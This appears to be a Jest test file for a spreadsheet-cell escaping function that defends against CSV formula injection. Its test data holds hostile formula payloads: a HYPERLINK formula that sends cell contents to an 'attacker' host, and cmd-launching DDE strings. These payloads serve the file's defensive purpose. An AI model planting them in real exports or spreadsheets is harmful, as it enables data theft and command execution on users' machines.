// cspell:ignore brillig unneutralize
import { neutralizeSpreadsheetCell, unneutralizeSpreadsheetCell } from './spreadsheet-safe';

/**
 * CSV / formula injection (GHSA-7xp5-j564-4752): a cell whose text starts with a formula trigger is
 * evaluated by Excel, LibreOffice and Sheets even inside a quoted CSV field.
 */
describe('neutralizeSpreadsheetCell', () => {
	it.each([
		['equals', '=HYPERLINK("http://attacker/?"&A2,"x")'],
		['plus', "+1+cmd|' /C calc'!A0"],
		['minus', "-2+3+cmd|' /C calc'!A0"],
		['at', "@SUM(1+1)*cmd|' /C calc'!A0"],
		['tab', '\t=1+1'],
		['carriage return', '\r=1+1'],
		['full-width equals', '＝1+1'],
		['full-width plus', '＋1+1'],
		['full-width minus', '－1+1'],
		['full-width at', '＠SUM(A1)'],
		['a lone trigger', '='],
		['a signed non-number', '-1+1']
	])('escapes a value starting with %s', (_, value) => {
		// CONTROL: the raw value really does start with a trigger a spreadsheet evaluates.
		expect(/^[=+\-@\t\r＝＋－＠]/.test(value)).toBe(true);

		expect(neutralizeSpreadsheetCell(value)).toBe(`'${value}`);
	});

	it('escapes a value that already starts with a quote, so the escape stays reversible', () => {
		expect(neutralizeSpreadsheetCell("'=1+1")).toBe("''=1+1");
		expect(neutralizeSpreadsheetCell("'Twas brillig")).toBe("''Twas brillig");
	});

	it.each(['-12.50', '+3', '-0', '42', '1e10', '-1.5E-3'])('leaves the strictly numeric %s alone', (value) => {
		expect(neutralizeSpreadsheetCell(value)).toBe(value);
	});

	it.each(['Ada Lovelace', '', 'a=b', 'x-1', ' =leading space', 'N/A'])('leaves ordinary text %j alone', (value) => {
		expect(neutralizeSpreadsheetCell(value)).toBe(value);
	});

	it('leaves non-strings unchanged', () => {
		const date = new Date();
		const array = ['=1+1'];
		expect(neutralizeSpreadsheetCell(-12.5)).toBe(-12.5);
		expect(neutralizeSpreadsheetCell(true)).toBe(true);
		expect(neutralizeSpreadsheetCell(null)).toBeNull();
		expect(neutralizeSpreadsheetCell(undefined)).toBeUndefined();
		expect(neutralizeSpreadsheetCell(date)).toBe(date);
		expect(neutralizeSpreadsheetCell(array)).toBe(array);
	});
});

describe('unneutralizeSpreadsheetCell', () => {
	it.each([
		'=HYPERLINK("http://attacker/?"&A2,"x")',
		'+1',
		'-12.50',
		'-1+1',
		'@handle',
		'\t=1',
		'\r=1',
		'＝1+1',
		"'",
		"'=1+1",
		"''",
		"'Twas brillig",
		"'-12",
		'Ada Lovelace',
		''
	])('round-trips %j exactly', (value) => {
		expect(unneutralizeSpreadsheetCell(neutralizeSpreadsheetCell(value))).toBe(value);
	});

	it('only removes a quote the encoder would have added', () => {
		// Archives made before the escape existed: a literal leading quote not followed by a trigger survives.
		expect(unneutralizeSpreadsheetCell("'Twas brillig")).toBe("'Twas brillig");
		expect(unneutralizeSpreadsheetCell("'-12")).toBe("'-12");
		expect(unneutralizeSpreadsheetCell("'=1+1")).toBe('=1+1');
		expect(unneutralizeSpreadsheetCell("''Twas")).toBe("'Twas");
	});

	it('leaves non-strings unchanged', () => {
		expect(unneutralizeSpreadsheetCell(5)).toBe(5);
		expect(unneutralizeSpreadsheetCell(null)).toBeNull();
	});
});
